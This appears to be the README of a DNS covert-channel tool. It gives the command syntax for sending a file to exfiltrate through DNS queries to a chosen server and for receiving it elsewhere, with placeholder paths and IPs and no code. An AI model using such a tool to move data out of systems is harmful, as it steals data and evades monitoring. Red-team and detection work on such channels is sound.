# DNS-Covert-Channel

## Use

### Sending
Proper syntax is ./main --fileIn <filepath> --dns <IP>
- filepath points to the file to exfiltrate
- IP is the DNS server to query

### Receiving
Proper syntax is ./main --fileOut <filepath> --dns <IP>
- filepath is the location to save the output
- IP is the DNS server to query